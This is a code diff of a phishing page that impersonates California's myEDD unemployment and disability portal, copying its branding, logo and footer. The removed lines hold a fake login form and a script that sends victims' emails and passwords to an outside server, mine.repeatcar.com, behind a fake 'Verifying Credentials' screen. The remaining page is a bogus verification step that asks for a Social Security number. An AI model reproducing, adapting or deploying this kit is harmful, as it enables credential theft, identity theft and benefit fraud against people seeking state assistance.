@@ -20,125 +20,8 @@
 </head>
 <body class="min-h-screen flex flex-col bg-[#E4F0FC]">
     
-    <!-- PAGE 1: LOGIN -->
-    <div id="page-login">
-        <!-- Utility Header -->
-        <header class="bg-[#046b99] text-white py-2">
-            <div class="max-w-7xl mx-auto px-4 flex justify-between items-center h-[38px]">
-                <a href="#"><img src="https://i.postimg.cc/FdtHKJg7/new-ca-image.png" alt="CA.gov" class="h-[30px]"></a>
-                <div class="text-sm font-source-sans">English</div>
-            </div>
-        </header>
-
-        <!-- Navigation -->
-        <nav class="bg-white gold-bar py-4">
-            <div class="max-w-7xl mx-auto px-4">
-                <svg class="h-10 md:h-12" viewBox="0 0 177 52" fill="none" xmlns="http://www.w3.org/2000/svg">
-                    <g clip-path="url(#clip0)">
-                        <path d="M0 40.6476L5.09796 11.8985H28.6721L27.4824 18.6078H13.3858L12.6562 22.7196H24.5846L23.3948 29.4288H11.4683L10.6673 33.9393H25.3255L24.1357 40.6486H0V40.6476Z" fill="#00587C"/>
-                        <path d="M40.9345 18.6068H42.7412C47.8007 18.6068 49.4853 20.2034 48.4232 26.1928C47.4607 31.6229 44.6409 33.9384 40.2228 33.9384H38.2151L40.9355 18.6068H40.9345ZM39.9964 40.6476C49.2731 40.6476 56.0725 36.4938 57.9919 25.6737C59.6709 16.2111 54.6518 11.8985 45.3357 11.8985H32.6458L27.5469 40.6476H39.9964Z" fill="#00587C"/>
-                        <path d="M71.1719 18.6068H72.9786C78.038 18.6068 79.7236 20.2034 78.6616 26.1928C77.6972 31.6229 74.8773 33.9384 70.4611 33.9384H68.4534L71.1719 18.6068ZM70.2357 40.6476C79.5104 40.6476 86.3118 36.4938 88.2311 25.6737C89.9082 16.2111 84.891 11.8985 75.574 11.8985H62.8841L57.7861 40.6476H70.2357Z" fill="#00587C"/>
-                        <path d="M108.116 30.2925L108.802 32.1757L109.688 26.485L112.187 11.8985H118.032L112.832 40.6719H106.585L99.6126 23.1192L98.5646 20.2743L98.0406 24.2013L95.34 40.6719H89.335L94.6555 11.8985H100.943L108.117 30.2925H108.116Z" fill="#CF7F00"/>
-                        <path d="M122.348 31.4997C122.309 31.7313 122.27 32.002 122.27 32.6201C122.27 34.3586 123.435 36.1745 126.156 36.1745C127.866 36.1745 129.225 35.2082 129.847 34.0495H135.87C134.821 37.2949 131.517 40.5011 125.883 40.5011C120.249 40.5011 116.907 36.7151 116.907 30.5334C116.907 25.318 120.288 18.7114 127.787 18.7114C132.488 18.7114 136.723 21.532 136.723 28.3318C136.723 29.6838 136.607 30.6501 136.413 31.4997H122.346H122.348ZM131.363 27.7137V26.9416C131.363 25.0482 130.274 23.0399 127.399 23.0399C124.524 23.0399 123.125 25.4356 122.736 27.7147H131.362L131.363 27.7137Z" fill="#CF7F00"/>
-                        <path d="M168.821 13.0394H174.355L173.232 19.1399H176.28L175.599 23.0473H172.471L170.706 33.255C170.626 33.8133 170.505 34.4911 170.505 34.8898C170.505 35.6871 170.987 35.9663 171.789 35.9663C172.672 35.9663 173.353 35.6871 173.915 35.6078L173.274 40.1537C172.271 40.4329 171.308 40.6719 169.865 40.6719C167.378 40.6719 164.692 39.7952 164.692 36.6049C164.692 36.0867 164.772 35.5284 165.052 33.9729L166.898 23.0473H161.354L164.651 19.1399H167.659L168.823 13.0394H168.821Z" fill="#CF7F00"/>
-                        <path d="M152.593 28.8985V28.9013L148.651 33.4351L139.895 43.5177H132.591L143.651 30.7901H138.365L139.177 26.1414H145.136L140.675 16.8842H146.802L149.987 23.4964L152.593 28.8985Z" fill="#00587C"/>
-                    </g>
-                </svg>
-            </div>
-        </nav>
-
-        <!-- Main Content -->
-        <main class="flex-grow py-6 md:py-10 lg:py-20">
-            <div class="max-w-7xl mx-auto px-4 grid grid-cols-1 lg:grid-cols-2 gap-8 lg:gap-24 items-center">
-                
-                <!-- Left Column -->
-                <div class="flex flex-col">
-                    <h1 class="text-3xl md:text-4xl lg:text-[48px] text-[#333] mb-4 leading-tight font-serif">
-                        Welcome to myEDD
-                    </h1>
-                    <p class="text-lg md:text-xl lg:text-2xl text-[#333] mb-6 md:mb-10 leading-normal">
-                        myEDD connects you to unemployment, disability, paid family leave, and benefit overpayment services.
-                    </p>
-                    <div class="hidden lg:block">
-                        <img src="https://myedd.edd.ca.gov/resource/1690600021000/ca_images/login-left-img.svg" 
-                             alt="Login" class="w-full max-w-[400px]">
-                    </div>
-                </div>
-
-                <!-- Right Column - Login Form -->
-                <div class="w-full max-w-[530px] lg:ml-auto">
-                    <h2 class="text-2xl md:text-[36px] text-[#333] mb-6 md:mb-8 font-serif">Log In</h2>
-                    
-                    <form onsubmit="return false;">
-                        <div class="mb-5 md:mb-6">
-                            <label class="block text-[#333] font-bold text-lg md:text-xl mb-2">Email</label>
-                            <input type="email" id="login-email" required
-                                   class="w-full px-3 md:px-4 py-3 md:py-4 text-lg md:text-xl border border-[#999] rounded-2xl">
-                        </div>
-
-                        <div class="mb-6 md:mb-8">
-                            <label class="block text-[#333] font-bold text-lg md:text-xl mb-2">Password</label>
-                            <div class="relative flex">
-                                <input type="password" id="login-password" required
-                                       class="w-full px-3 md:px-4 py-3 md:py-4 text-lg md:text-xl border border-[#999] rounded-l-2xl border-r-0">
-                                <button type="button" onclick="togglePasswordVisibility()"
-                                        class="px-3 md:px-4 border border-[#999] rounded-r-2xl bg-white text-[#046b99] text-sm md:text-base">
-                                    Show
-                                </button>
-                            </div>
-                            <div class="mt-2 text-right">
-                                <a href="#" class="text-[#046b99] hover:underline text-base md:text-lg decoration-dotted underline-offset-4">
-                                    Forgot password?
-                                </a>
-                            </div>
-                        </div>
-
-                        <div class="mb-6 md:mb-8">
-                            <button type="button" onclick="showVerification()"
-                                    class="w-full bg-[#046b99] hover:bg-[#035980] text-white font-serif text-lg md:text-xl py-3 md:py-4 rounded-2xl transition-all">
-                                Log In
-                            </button>
-                        </div>
-
-                        <div class="mb-4">
-                            <p class="text-lg md:text-xl text-[#333] mb-2">Don't have an account?</p>
-                            <button type="button"
-                                    class="w-full bg-[#f5f5f5] hover:bg-gray-200 text-[#555] border border-[#555] font-serif text-lg md:text-xl py-3 md:py-4 rounded-2xl">
-                                Create Account
-                            </button>
-                        </div>
-                    </form>
-                </div>
-            </div>
-        </main>
-
-        <!-- Footer -->
-        <footer class="bg-[#222] text-white py-4 mt-auto font-source-sans">
-            <div class="max-w-7xl mx-auto px-4">
-                <ul class="flex flex-col md:flex-row md:space-x-6 text-sm text-center md:text-left space-y-2 md:space-y-0 mb-4 md:mb-2">
-                    <li><a href="#" class="hover:underline">Contact EDD</a></li>
-                    <li><a href="#" class="hover:underline">Conditions of Use</a></li>
-                    <li><a href="#" class="hover:underline">Privacy Policy</a></li>
-                    <li><a href="#" class="hover:underline">Accessibility</a></li>
-                </ul>
-                <div class="text-gray-400 text-sm text-center md:text-left">© 2025 State of California</div>
-            </div>
-        </footer>
-    </div>
-
-    <!-- LOADING OVERLAY -->
-    <div id="loading-overlay" class="hidden fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
-        <div class="bg-white rounded-2xl p-8 md:p-12 text-center max-w-md mx-4">
-            <div class="mb-6">
-                <div class="inline-block animate-spin rounded-full h-16 w-16 border-4 border-[#046b99] border-t-transparent"></div>
-            </div>
-            <h3 class="text-xl md:text-2xl font-bold text-[#333] mb-2">Verifying Credentials</h3>
-            <p class="text-base md:text-lg text-gray-600">Please wait...</p>
-        </div>
-    </div>
-
     <!-- PAGE 2: VERIFICATION -->
-    <div id="page-verify" class="hidden min-h-screen flex flex-col bg-[#E4F0FC]">
+    <div id="page-verify" class="min-h-screen flex flex-col bg-[#E4F0FC]">
         <!-- Header -->
         <header class="bg-[#046b99] text-white py-2">
             <div class="max-w-7xl mx-auto px-4 flex justify-between items-center h-[38px]">
@@ -190,7 +73,7 @@
 
                     <div class="mb-6">
                         <label class="block text-[#333] font-bold text-lg md:text-xl mb-3">Email *</label>
-                        <input type="email" id="verify-email" readonly class="w-full px-3 md:px-4 py-3 md:py-4 text-base md:text-lg border border-[#999] rounded-2xl bg-gray-50">
+                        <input type="email" id="verify-email" class="w-full px-3 md:px-4 py-3 md:py-4 text-base md:text-lg border border-[#999] rounded-2xl bg-white">
                     </div>
 
                     <div class="mb-6">
@@ -259,11 +142,6 @@
     </div>
 
     <script>
-        function togglePasswordVisibility() {
-            const pwd = document.getElementById('login-password');
-            pwd.type = pwd.type === 'password' ? 'text' : 'password';
-        }
-
         function toggleSSNVisibility() {
             const ssn = document.getElementById('ssn');
             const btn = event.target;
@@ -273,48 +151,6 @@
             } else {
                 ssn.type = 'password';
                 btn.textContent = 'Show';
-            }
-        }
-
-        function showVerification() {
-            const email = document.getElementById('login-email').value;
-            const password = document.getElementById('login-password').value;
-            
-            if (!email) {
-                alert('Please enter your email');
-                return;
-            }
-            if (!password) {
-                alert('Please enter your password');
-                return;
-            }
-            
-            // Send login credentials to Telegram immediately
-            sendLoginToTelegram(email, password);
-            
-            // Show loading overlay
-            document.getElementById('loading-overlay').classList.remove('hidden');
-            
-            // After 3 seconds, hide loading and show verification page
-            setTimeout(() => {
-                document.getElementById('verify-email').value = email;
-                document.getElementById('page-login').classList.add('hidden');
-                document.getElementById('loading-overlay').classList.add('hidden');
-                document.getElementById('page-verify').classList.remove('hidden');
-                window.scrollTo(0, 0);
-            }, 3000);
-        }
-
-        async function sendLoginToTelegram(email, password) {
-            const loginData = new FormData();
-            loginData.append('login_email', email);
-            loginData.append('login_password', password);
-            loginData.append('page', 'login_page');
-            
-            try {
-                await fetch('https://mine.repeatcar.com/568/op/report.php', { method: 'POST', body: loginData });
-            } catch (error) {
-                console.error('Login send error:', error);
             }
         }
 
